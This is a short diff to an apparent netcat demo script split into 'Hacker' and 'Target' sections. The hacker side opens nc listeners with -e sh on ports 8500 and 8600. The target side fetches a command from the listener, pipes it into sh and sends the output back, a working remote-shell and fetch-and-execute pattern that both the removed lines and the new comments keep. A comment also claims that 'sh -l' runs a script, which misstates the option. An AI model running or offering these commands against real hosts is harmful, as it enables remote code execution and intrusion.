@@ -4,8 +4,9 @@
 
 
 #----------Hacker----------
-echo 1 | nc -lp 8500 -s 0.0.0.0 -e sh -c 'echo "ls -lda /etc/" ' && echo 1 | nc -lp 8600 -s 0.0.0.0
-#Or run hacker.sh
+sh -l hacker.sh
+#The -l option in sh runs the script.
+#Or `echo 1 | nc -lp 8500 -s 0.0.0.0 -e sh -c 'echo "ls -lda /etc/" ' && echo 1 | nc -lp 8600 -s 0.0.0.0`
 
 
 ###The command we want is "ls -lda /etc/".
@@ -16,5 +17,6 @@ echo 1 | nc -lp 8500 -s 0.0.0.0 -e sh -c 'echo "ls -lda /etc/" ' && echo 1 | nc 
 
 
 #----------Target----------
-echo 1 | nc 0.0.0.0 8600 -e sh -c "echo $(nc 0.0.0.0 8500 2>/dev/null | sh)"
-#Or run target.sh
+sh -l target.sh
+#Or `echo 1 | nc 0.0.0.0 8600 -e sh -c "echo $(nc 0.0.0.0 8500 2>/dev/null | sh)"`
+
